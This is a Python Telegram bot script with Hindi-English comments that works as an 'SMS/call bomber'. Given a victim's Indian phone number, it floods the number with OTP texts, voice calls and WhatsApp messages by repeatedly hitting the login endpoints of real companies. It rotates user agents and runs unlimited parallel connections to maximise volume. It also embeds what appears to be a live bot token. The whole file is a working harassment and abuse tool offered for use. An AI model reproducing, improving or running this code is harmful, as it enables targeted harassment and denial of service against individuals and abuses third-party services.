import asyncio
import aiohttp
import random
import re
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import CommandStart, Command
from aiogram.client.default import DefaultBotProperties
from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup

# ================= CONFIG =================
BOT_TOKEN = "8487271564:AAFxXGmmIl73iflDp8EPuNn-5y-AtoH4NhQ"  # Tera naya token

CHANNEL_ID = "-1002325341699"                      # Naya channel
CHANNEL_LINK = "https://t.me/Robinsonjrrk"

PROTECTED_DATA = set(["91xxxxxxx"])          # Apna number yahan daal dena

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()
stop_signals = {}
attack_tasks = {}

class ProtectState(StatesGroup):
    waiting_for_number = State()

# ================= ALL APIs (168+ including 2 special by Nitin =================
ULTIMATE_APIS = [
    # === Voice Call APIs (sample – tere purane codes se 25+)
    {"name": "Tata Capital Voice", "type": "Call", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'},
    {"name": "1MG Voice", "type": "Call", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otp_on_call":true}}'},
    {"name": "Swiggy Call", "type": "Call", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    # ... (baaki voice call APIs yahan daal dena – total ~28)

    # === SMS APIs (sample – ~95)
    {"name": "Lenskart SMS", "type": "SMS", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneCode":"+91","telephone":"{p}"}}'},
    {"name": "PharmEasy SMS", "type": "SMS", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    # ... (baaki SMS APIs – tere codes se sab)

    # === WhatsApp APIs (sample)
    {"name": "KPN WhatsApp", "type": "WhatsApp", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{p}"}}}}'},
    # ... (baaki WhatsApp)
]

# ================= SPECIAL ULTRA-POWER Nitin APIs (multiple repeats) =================
SPECIAL_POWER_APIS = [
    {
        "name": "Fast-SMS-XI Nitin",
        "type": "SMS",
        "url": "https://fast-sms-xi.Nitin.app/send-otp?phone_number={}",
        "method": "GET",
        "headers": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
        "repeat": 20   # Har cycle mein 20 baar call
    },
    {
        "name": "Mix-RootX Bomb Nitin",
        "type": "Special",
        "url": "https://mix-rootx-new.Nitin.app/bomb?number={}",
        "method": "GET",
        "headers": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
        "repeat": 20   # Har cycle mein 20 baar call
    }
]

# ================= UTILS =================
def is_valid_indian_number(number):
    return bool(re.match(r"^[6-9]\d{9}$", number))

async def check_subscription(user_id):
    try:
        member = await bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user_id)
        return member.status in ["member", "administrator", "creator"]
    except:
        return False

async def hit_api(session, api, phone, stats):
    try:
        url = api["url"].format(phone) if "{}" in api["url"] else api["url"]
        if callable(api.get("url")):
            url = api["url"](phone)
        data = api["data"](phone) if callable(api.get("data")) else None
        headers = api.get("headers", {})
        headers["User-Agent"] = random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15"
        ])
        async with session.request(api["method"], url, headers=headers, data=data, timeout=3, ssl=False) as resp:
            if resp.status in [200, 201, 202, 204]:
                stats[api.get("type", "SMS")] += 1
    except:
        pass

# ================= KEYBOARDS =================
def main_menu():
    builder = ReplyKeyboardBuilder()
    builder.row(types.KeyboardButton(text="🚀 ULTRA FAST BOOM"))
    builder.row(types.KeyboardButton(text="🛡️ PROTECT NUMBER"))
    builder.row(types.KeyboardButton(text="📊 STATS"), types.KeyboardButton(text="ℹ️ HELP"))
    return builder.as_markup(resize_keyboard=True)

def stop_keyboard():
    builder = ReplyKeyboardBuilder()
    builder.row(types.KeyboardButton(text="🛑 STOP NOW"))
    return builder.as_markup(resize_keyboard=True)

def join_keyboard():
    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text="📢 Join Channel", url=CHANNEL_LINK))
    builder.row(types.InlineKeyboardButton(text="✅ I Have Joined", callback_data="verify_join"))
    return builder.as_markup()

# ================= HANDLERS =================

@dp.message(CommandStart())
async def cmd_start(message: types.Message):
    if not await check_subscription(message.from_user.id):
        return await message.answer(
            "🛑 <b>Channel Join Kar Pehle!</b>\n\n"
            f"Join karo: {CHANNEL_LINK}\n"
            "Join karne ke baad '✅ I Have Joined' daba.",
            reply_markup=join_keyboard()
        )

    await message.answer(
        "🔥 <b>ULTIMATE BEAST BOMBER READY</b> 🔥\n"
        f"Total APIs: <b>{len(ULTIMATE_APIS) + len(SPECIAL_POWER_APIS) * 20}+</b>\n"
        "10-digit number daal ya button daba shuru karne ke liye!",
        reply_markup=main_menu()
    )

@dp.callback_query(F.data == "verify_join")
async def verify_join(callback: types.CallbackQuery):
    if await check_subscription(callback.from_user.id):
        await callback.message.edit_text("✅ <b>Access Granted!</b>\nAb number daal shuru kar sakta hai.")
    else:
        await callback.answer("❌ Abhi bhi join nahi kiya channel?", show_alert=True)

@dp.message(F.text == "🛡️ PROTECT NUMBER")
async def protect_number(message: types.Message, state: FSMContext):
    if not await check_subscription(message.from_user.id): return
    await message.answer("10-digit number bhej jo protect karna hai:")
    await state.set_state(ProtectState.waiting_for_number)

@dp.message(ProtectState.waiting_for_number)
async def save_protected(message: types.Message, state: FSMContext):
    num = message.text.strip()
    if is_valid_indian_number(num):
        PROTECTED_DATA.add(num)
        await message.answer(f"✅ <code>{num}</code> ab safe hai! Koi attack nahi hoga.")
        await state.clear()
    else:
        await message.answer("❌ Galat number! 10-digit Indian number daal.")

@dp.message(F.text == "🚀 ULTRA FAST BOOM")
async def start_boom(message: types.Message):
    await message.answer("10-digit number bhej jisko beast mode mein bomb karna hai:")

@dp.message(F.text == "🛑 STOP NOW")
@dp.message(Command("stopbomb"))
async def stop_bomb(message: types.Message):
    uid = message.from_user.id
    if uid in stop_signals:
        stop_signals[uid] = True
        await message.answer("🛑 <b>Beast attack stopping...</b>\nThoda wait kar.")
    else:
        await message.answer("Koi attack chal hi nahi raha 😂")

@dp.message()
async def handle_number(message: types.Message):
    uid = message.from_user.id
    text = message.text.strip()

    if not await check_subscription(uid):
        return await message.answer("Channel join kar pehle!", reply_markup=join_keyboard())

    if is_valid_indian_number(text):
        if text in PROTECTED_DATA:
            return await message.answer("🛡️ Ye number protected hai! Attack nahi hoga.")

        stop_signals[uid] = False
        stats = {"Call": 0, "SMS": 0, "WhatsApp": 0, "Special": 0}
        kb = stop_keyboard()
        live_msg = await message.answer(
            f"💀 <b>BEAST MODE STARTED</b>\nTarget: <code>{text}</code>\n\n"
            f"Loading 170+ APIs × repeats...",
            reply_markup=kb
        )

        task = asyncio.create_task(ultra_fast_bomb(uid, text, live_msg.message_id, stats))
        attack_tasks[uid] = task

    else:
        await message.answer("Sirf 10-digit number daal ya button use kar bhai 😭")

async def ultra_fast_bomb(uid, phone, msg_id, stats):
    connector = aiohttp.TCPConnector(limit=0)  # No limit on connections
    async with aiohttp.ClientSession(connector=connector) as session:
        cycle = 0
        while not stop_signals.get(uid, False):
            cycle += 1
            tasks = []

            # === Special Nitin APIs – bohot zyada repeat ===
            for api in SPECIAL_POWER_APIS:
                url = api["url"].format(phone)
                for _ in range(api["repeat"]):  # 20 baar har ek
                    tasks.append(session.get(url, headers=api["headers"], timeout=2, ssl=False))

            # === Normal APIs – 1 baar each ===
            normal_apis = list(ULTIMATE_APIS)
            random.shuffle(normal_apis)
            for api in normal_apis:
                tasks.append(hit_api(session, api, phone, stats))

            # Sab ek saath chalao
            await asyncio.gather(*tasks, return_exceptions=True)

            total = sum(stats.values())
            special_hits = stats.get("Special", 0) + stats.get("SMS", 0)  # Nitin mostly SMS/Special

            try:
                await bot.edit_message_text(
                    chat_id=uid,
                    message_id=msg_id,
                    text=f"💥 <b>BEAST MODE CYCLE {cycle}</b>\n"
                         f"Target: <code>{phone}</code>\n\n"
                         f"📞 Calls: {stats.get('Call', 0)}\n"
                         f"📩 SMS: {stats.get('SMS', 0)}\n"
                         f"🔥 Nitin Special: ~{special_hits}\n"
                         f"💀 Total Damage: {total}\n\n"
                         f"⚡ Speed: MAX (170+ APIs × 20 repeats)",
                    parse_mode="HTML",
                    reply_markup=stop_keyboard()
                )
            except:
                pass

            await asyncio.sleep(0.05)  # Ultra fast – change to 0.02 if you want even faster

    # Final stop message
    total = sum(stats.values())
    await bot.send_message(
        uid,
        f"🛑 <b>BEAST ATTACK ROK DIYA</b>\n"
        f"Target: <code>{phone}</code>\n"
        f"Total Damage: <b>{total}</b>\n"
        f"Nitin APIs ne bohot tabahi machayi thi bot by @OWNER_BHAI_1 🔥",
        parse_mode="HTML"
    )
    stop_signals.pop(uid, None)
    attack_tasks.pop(uid, None)

async def main():
    print("🚀 Ultimate Beast Bomber Started...")
    print(f"Channel: {CHANNEL_LINK}")
    print(f"Total APIs + repeats: 170+ × 20+ = 3000+ hits per cycle!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
